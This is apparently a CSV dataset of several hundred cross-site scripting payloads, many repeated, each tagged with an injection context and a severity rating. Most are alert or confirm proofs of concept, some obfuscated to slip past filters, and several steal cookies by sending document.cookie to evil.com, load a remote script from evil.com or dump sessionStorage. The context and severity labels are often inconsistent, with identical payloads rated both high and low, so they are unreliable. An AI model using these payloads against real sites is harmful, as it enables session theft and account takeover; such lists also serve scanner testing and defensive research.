payload,context,severity
"""><ImG SrC=X OnErRoR=AlErT(1)>",tag_injection,high
javascript:confirm(1),js_uri,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
%3Csvg/onload=alert(1)%3E,tag_injection,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"eval(""alert(1)"")",dom_sink,medium
"\"" onerror=alert(1)//",dom_sink,medium
<marquee onstart=alert(1)>,script_injection,high
<script>alert(1)</script>,tag_injection,medium
onerror='alert(1)',html_body,medium
<svgonload=alert(1)>,html_body,medium
"""><svg onload=alert()>",html_body,medium
<svg><a onload=alert(1)></a>,html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
<img src=x onerror=alert(1)>,event_handler,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"prompt`1`)//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
javascript:alert(1),attribute_escape,high
#{\u0061\u006cert(1)},template_injection,medium
{{constructor.constructor('eval(atob(\'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\'))')()}},js_block,high
<%00script>d.innerHTML+='';</script>,html_body,high
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
javascript:alert(1),js_uri,low
"<iframe src=""javascript:confirm(1)"">",tag_injection,low
confirm(),html_body,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<script>alert(	document.domain)</script>,script_injection,high
</tag><svg onload=alert(1)>,html_body,medium
&lt;svg onload=alert(1)&gt;,attribute_escape,high
"setTimeout(""alert(1)"",0)",event_handler,high
"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,medium
<marquee onstart=alert(1)>,script_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,low
setInterval('ale'+'rt(10)');,html_body,high
<script>alert(1)</script>,script_injection,medium
prompt(9),html_body,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<%= alert(1) %>,js_uri,medium
"\"" onerror=alert(1)//",attribute_escape,medium
"<iframe src=""javascript:al'+'ert(1)"">",tag_injection,high
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"eval(""al'+'ert(1)"")",script_injection,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
onerror=alert(0);>,html_body,medium
"\"" onerror=alert(1)//",attribute_escape,low
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
SEtinteRvAL('aLe'+'rt(10)');,html_body,high
${alert(1)},template_injection,high
<body onload=alert(1)>,event_handler,high
javascript:alert(1),attribute,low
javascript:confirm(	1),js_uri,high
<script>alert(1)</script>,tag_injection,medium
\x3cvideo src=x onerror=alert(1)\x3e,event_handler,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
`${alert(1)}`,js_block,medium
innerHTML=location.hash>#<%00script>alert(1)</script>,attribute,high
<BODY ONLOAD=alert(8839)>,html_body,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
"onerror=""self.alert(1)""",html_body,medium
"location=""javascript:alert(1)""",dom_sink,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
\' onerror=alert(1)//,attribute_escape,high
ONLoaD='aLert(1)',html_body,medium
&lt;img src=x onerror=alert(1)&gt;,tag_injection,low
<img src=x onerror=alert(1)>,tag_injection,low
alert(1);,html_body,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
"""><sCripT AlErT(sTriNg.FrOMchaRcoDe(88,83,83))</SCriPT>",html_body,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
""" onerror=alert(1) x=""",attribute,medium
"location=""javascript:alert(1)""",script_injection,medium
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,low
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
onerror=top.alert(1);>,html_body,medium
"ontouchstart=""alert(1)""",html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",js_uri,high
<details open ontoggle=alert(1)>,event_handler,high
"mrco24""type=image src onerror=""alert(1)""",html_body,medium
onerror=alert(0);>,html_body,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
<svg/onload=alert(1)>,tag_injection,low
' onmouseover=alert(1) ',script_injection,medium
javascript:alert(1),js_uri,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"document.write(	""<img src
=x onerror
=alert(	1)>"")",dom_sink,medium
\' onerror=alert(1)//,attribute_escape,medium
<SCRipT>D.inNeRhTMl+='';</sCriPt>,attribute,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"data:text/html,<script>alert(1)</script>",template_injection,low
"<audio>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
"""><svg onload=alert()>",html_body,medium
onerror=alert(0);>,html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
confirm(),html_body,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
"dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt>",js_uri,low
.alert(1);,html_body,medium
javascript:al'+'ert(1),js_uri,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
&lt;img src=x onerror=alert(1)&gt;,tag_injection,medium
"eval(""alert(1)"")",dom_sink,low
"""><ImG SrC=X OnErRoR=AlErT(1)>",attribute,low
<%= aLeRt(1) %>,script_injection,low
"""><svg
 onload=alert(1)>",attribute,medium
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
"<vIdeO><sourCe onerror&#61;""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",attribute,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
<%= alert(1) %>,template_injection,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",attribute,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
<svg/onload=alert(1)>,tag_injection,high
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
""" onload=alert(1) x=""",attribute,low
alert(1),html_body,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
<svgonload=alert(1)>,html_body,medium
"<object data=""javaSCRIPT:alert(1)"">",tag_injection,high
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,script_injection,high
"data:text/html,<script>alert(1)</script>",dom_sink,low
alert(1);,html_body,medium
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
"\"" onerror=alert(1)//",attribute_escape,medium
confirm(),html_body,medium
' onerror=alert(1) x=',attribute_escape,high
"\"" onload=alert(1)//",dom_sink,low
&lt;video src=x onerror=alert(1)&gt;,tag_injection,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
<img/’onerror=alert(1) src=a>,html_body,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",event_handler,low
"setTimeout(""alert(1)"",0)",attribute_escape,medium
\' onerror=alert(1)//,js_uri,low
\' onerror=confirm(1)//,attribute_escape,low
javascript:confirm(1),js_uri,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""><svg onload=alert(document.cookie)>",html_body,medium
%3Cimg/src=%3Dx+onload=self.alert(1)%3D,attribute,medium
<img/src/onerror=alert(1),html_body,medium
"<details open ontoggle
=alert(	1)>",event_handler,low
""" onerror=alert(1) x=""",js_uri,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<svg onload=alert(1)>,event_handler,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"eval(""alert(1)"")",dom_sink,high
innerHTML=location.hash>#<textarea>alert(1)</script>,html_body,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
"//--></SCRIPT><img>alert(String.fromCharCode(88,83,83));",html_body,high
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<input onfocus=alert(1) autofocus>,event_handler,high
<svgonload=alert(1)>,html_body,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
<details open ontoggle=alert(1)>,event_handler,medium
#{alert(1)},template_injection,low
<svgonload=alert(1)>,html_body,medium
<img src=x onerror=confirm(1)>,attribute,low
""" onload=alert(1) x=""",attribute,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
\' onerror=alert(1)//,script_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"javascript:void(document.location=""http://evil.com"")",js_uri,low
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
onload=”alert(‘AnonKryptiQuz’),html_body,medium
-alert(23)/,html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
"\"" onerror=confirm(1)//",js_uri,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",html_body,high
%3Csvg%20onload=alert(1)%3E,html_body,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"onerror=""alert(1)""",html_body,medium
""" onerror
=alert(	1) x
=""",attribute,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
' onmouseover=alert(1) ',attribute,low
<svg onload=alert()>,html_body,medium
javascript:alert(document.domain),attribute,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"data:text/html,<script>alert(1)</script>",js_uri,low
jAvAsCrIpT:CoNfIrM(1),script_injection,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
<script>alert(document.domain)</script>,script_injection,low
"""><script
 alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
<SCRIPT>alert(1)</SCRIPT>,js_uri,high
"<video>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
"""><svg onload=alert()>",html_body,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
{{7*7}},template_injection,low
"""><script
>alert(String.fromCharCode(88,83,83))</script>",attribute,high
<BODY ONLOAD=alert(8839)>,attribute,medium
"&quot; onerror
=alert(	1) x
=&quot;",script_injection,low
"document.write(""<img src=x onerror=alert(1)>"")",attribute,low
<img/src=x onerror=alert(1)//>,event_handler,low
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
OnloAD='aLeRT(1)',html_body,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",attribute,high
"#""><svg onload=alert(1)>",attribute,medium
onerror=alert(0);>,html_body,medium
%3Cscript%3Eprompt(1)%3C/script%3E,script_injection,high
"?alert(1)"",",html_body,medium
' onerror=alert(1) x=',attribute,high
onerror=alert(0);>,html_body,medium
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",js_block,high
</script><svg onload=alert(1)>,html_body,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
;alert(1);,html_body,medium
javascript:confirm(1),url,medium
-prompt(1)/,attribute,medium
<BODY ONLOAD=alert(’XSS’)>,html_body,medium
"data:text/html,<script>confirm(1)</script>",js_uri,high
{{7*7}},script_injection,low
"<VIDeO><SouRcE ONErROR=""['Al\U0065'+'Rt'][0]['\x63OnsTRUctOr']['\X63OnStRUCTOr']('retURn tHIS')()[['aL\u0065'+'rT'][0]]([stRING.froMCharCoDE(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",attribute,high
#{\u0061\u006cert(1)},template_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"eval(""alert(1)"")",dom_sink,medium
&quot; onload=alert(1) x=&quot;,attribute_escape,high
"\"" onerror=alert(1)//",attribute_escape,medium
<marquee onstart=alert(1)>,event_handler,low
j\u0061v\u0061script:\u0061\u006cert(1),js_uri,medium
<body onload=alert(1)>,event_handler,medium
""" onfocus=alert(1) autofocus=""",attribute,low
alert(1),html_body,medium
<svg onload=alert(1)>,event_handler,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
onerror=alert(0);>,html_body,medium
<details open ontoggle=alert(1)>,event_handler,low
""" onfocus=alert(1) autofocus=""",attribute,medium
"?alert(1)"",",html_body,medium
"<svg onload=""confirm(7)"">",html_body,medium
<img src=x onerror=al'+'ert(1)>,event_handler,low
onload='alert(1)',html_body,medium
<svg/onload=alert(1)>,tag_injection,high
javaSCRIPT:alert(document.domain),js_uri,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"""><body>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<svg onload=alert(1)>,html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
foo\’; alert(document.cookie);//’;,js_block,high
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,low
<svg/onload=confirm(1)>,template_injection,medium
"OneRrOR=""aLert(1)""",html_body,medium
' onmouseover=al'+'ert(1) ',attribute,high
\x3csvg/onload=alert(1)\x3e,tag_injection,high
""">< svg onload=alert()>",html_body,medium
"""><svg src=x onerror=alert(1)>",attribute,high
<script>alert(	1)</script>,script_injection,high
"""><audio>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<svg/onresize=alert(String.fromCharCode(88,83,83))>",attribute,high
<svgonload=alert(1)>,html_body,medium
onerror=alert;throw 23;,html_body,low
javascript:alert(document.domain),tag_injection,high
\' OnErRoR=AlErT(1)//,attribute_escape,high
"%20""><svg onload=alert(1)>",html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"\""&gt;&lt;img src=x onerror=alert(1)&gt;",dom_sink,medium
<svgonload=alert(1)>,html_body,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
"<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
"onload=""alert(1)""",html_body,medium
<svg onerror=alert()>,html_body,medium
<img src/onerror=alert(1)>,html_body,medium
{{7*7}},template_injection,low
javascr/**/ipt:confirm(1),js_uri,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
confirm(),html_body,medium
;alert(1);,html_body,medium
嘼img src=1 onerror=alert(1)嘾,attribute,medium
"""></tag><svg onload=alert(1)>",html_body,medium
"location=""javascript:alert(1)""",js_uri,low
"\""><iMg sRc=x oNeRrOr=aLeRt(1)>",attribute_escape,medium
<img src/onerror=prompt(8)>,html_body,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
"document.write(""<img src=x onerror=alert(1)>"")",template_injection,high
javascript:alert(document.domain),js_uri,medium
"\"" onerror
=alert(	1)//",attribute_escape,low
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,medium
"document.write(""<svg src=x onerror=alert(1)>"")",script_injection,high
""" onload=alert(1) x=""",script_injection,low
onerror=confirm(1);>,html_body,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
ondblclick=alert(0);>,attribute,medium
"onload=""confirm(1)""",html_body,medium
<svg/onload=alert(1)>,dom_sink,high
<img src=x onerror=alert(1)>,script_injection,low
"setTimeout(""alert(1)"",0)",dom_sink,medium
<img src=x onerror=alert(1)>,event_handler,high
<svg onload=alert()>,html_body,medium
#{alert(1)},script_injection,medium
"data:text/html,<script>alert(1)</script>",js_uri,low
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute,high
setInterval('ale'+'rt(10)');,html_body,high
""" onfocus=alert(1) autofocus=""",attribute,low
"<meter>d.innerHTML+='';</script>//[""'`-->]]>]</div>",js_block,high
""" onfocus=alert(1) autofocus=""",attribute,low
<script>alert(document.domain)</script>,script_injection,high
"<iframe src=""javascript:confirm(1)"">",attribute,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,script_injection,medium
A” autofocus onfocus=alert(“XSS”)//,html_body,medium
\' onerror=alert(1)//,attribute_escape,low
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
<det\u0061i\u006cs open ontogg\u006ce=\u0061\u006cert(1)>,event_handler,low
"\"" onerror=alert(1)//",template_injection,high
"\' onerror
=alert(	1)//",attribute_escape,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",attribute,high
<img src/onerror=prompt(8)>,html_body,medium
<img src=x onerror=alert(1)>,event_handler,medium
<svg/onload=alert(1)>,tag_injection,high
' ><svg src=x onerror=alert(1)>,event_handler,medium
onload='alert(1)',attribute,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"<svg onload=""confirm(7)"">",html_body,medium
javascript:confirm(document.domain),attribute,medium
"eval(""alert(1)"")",event_handler,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"<svg onload=""confirm(7)"">",html_body,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
\u003cimg src onerror=confirm`1`\u003e,attribute,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<svg/onload=alert(1)>,tag_injection,medium
"""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=""",html_body,high
"%20""><svg onload=alert(1)>",html_body,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",attribute,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"location=""javascript:alert(1)""",dom_sink,low
#{alert(1)},template_injection,medium
\' onerror=alert(1)//,attribute_escape,medium
<input onfocus=alert(1) autofocus>,event_handler,high
<input onfocus=alert(1) autofocus>,event_handler,high
\' onerror=confirm(1)//,attribute_escape,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
"<svg onload=""confirm(7)"">",html_body,medium
<marquee onstart=alert(1)>,event_handler,high
%3Csvg/onload=alert(1)%3E,js_uri,medium
onerror=alert;throw 23;,html_body,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
ondblclick='alert(1)',attribute,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
alert(2),html_body,medium
' ><img src=x onload=alert(1)>,attribute,low
"onload=""alert(document.domain)""",html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
' onmouseover=alert(1) ',template_injection,medium
"?alert(1)"",",html_body,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
javascript:alert(	1),attribute,medium
"""><script	>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"eval(""alert(1)"")",dom_sink,low
onload=”alert(‘AnonKryptiQuz’),html_body,medium
&quot; onerror=alert(1) x=&quot;,dom_sink,low
"<img/src
=x onerror
=alert(	1)//>",tag_injection,high
javascript:confirm(1),attribute,low
javascript:alert(1),event_handler,medium
<body onload=confirm(1)>,attribute,medium
javascript:alert(1),dom_sink,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<body onload=alert(1)>,event_handler,medium
<marquee onstart=alert(1)>,event_handler,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
"\""><img src=x onload=alert(1)>",attribute_escape,medium
<marquee onstart=alert(1)>,event_handler,high
"' ><img src
=x onerror
=alert(	1)>",attribute,high
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,medium
<img src=x onerror=alert(1)>,event_handler,medium
<script>alert(1)</script>,script_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,high
<svgonmouseover=alert(1)>,attribute,medium
<svgonload=alert(1)>,html_body,medium
<img src=x onerror=alert(1)>,event_handler,low
<svg onload=alert(1)>,html_body,medium
alert(1);,html_body,medium
"<svg
 onload=alert()>",html_body,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<img src=x onerror=alert(1)>,attribute,medium
${al'+'ert(1)},template_injection,medium
<svg////////onload=alert(1)>,html_body,medium
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,low
"location=""javascript:alert(1)""",dom_sink,low
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<svg/onload=alert(1)>,tag_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
onerror='alert(1)',html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
' onerror=confirm(1) x=',template_injection,high
</tag><svg onload=alert(1)>,attribute,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"setTimeout(""confirm(1)"",0)",dom_sink,high
onauxclick=alert(0);>,html_body,medium
onload=”alert(‘AnonKryptiQuz’),attribute,medium
<iframe/onload=alert(0);>,html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
javascript:alert(document.domain),js_uri,low
alert(document.cookie);,attribute,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
javascript:confirm(1),js_uri,low
"onerror=""alert(1)""",html_body,medium
<scr/**/ipt>confirm(1)</scr/**/ipt>,script_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
<svg/onload=alert(1)>,tag_injection,medium
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",url,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
&quot; onerror=alert(1) x=&quot;,script_injection,low
alert(2),html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"""><math>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
oNErROR=aLERt(0);>,html_body,medium
<svg/onload=alert(1)>,tag_injection,low
javascript:alert(1),js_uri,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"location=""javascript:al'+'ert(1)""",dom_sink,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"document.write(""<svg src=x onerror=alert(1)>"")",dom_sink,medium
<script>confirm(1)</script>,script_injection,medium
onerror='alert(1)',html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
<script>alert(document.domain)</script>,script_injection,medium
+alert(1)+,html_body,medium
confirm(),html_body,medium
<video src=x onerror=alert(1)>,event_handler,low
<svg/onload=alert(1)>,tag_injection,medium
<iframe/onload=alert(0);>,html_body,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
innerHTML=location.hash>#< script>alert(1)</script>,attribute,high
onblur=”alert(‘AnonKryptiQuz’),html_body,medium
"location=""javascript:alert(1)""",dom_sink,low
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
"setTimeout(""\u0061\u006cert(1)"",0)",template_injection,medium
"&quot; onerror
=alert(	1) x
=&quot;",attribute_escape,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<script>alert(	document.domain)</script>,script_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
<img/src=x onerror=alert(1)//>,event_handler,medium
{{7*7}},template_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
<image src/onerror=alert(1)>,html_body,medium
{{7*7}},template_injection,low
<body on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,low
<img src/onerror=alert(1)>,html_body,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
#*/confirm(1),html_body,medium
<%= alert(1) %>,template_injection,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
prompt(9),html_body,medium
<video src=x onerror=al'+'ert(1)>,event_handler,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
""" onfocus=alert(1) autofocus=""",attribute,medium
<image src/onerror=alert(1)>,html_body,medium
inneRHTML=lOcATIon.hasH>#<sCRIPt>AlERt(1)</sCriPT>,html_body,high
"<img>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<img/src=x onerror=alert(1)//>,event_handler,high
<img src=x onerror=alert(1)>,tag_injection,low
' onmouseover=alert(1) ',attribute,low
""" onerror=alert(1) x=""",tag_injection,low
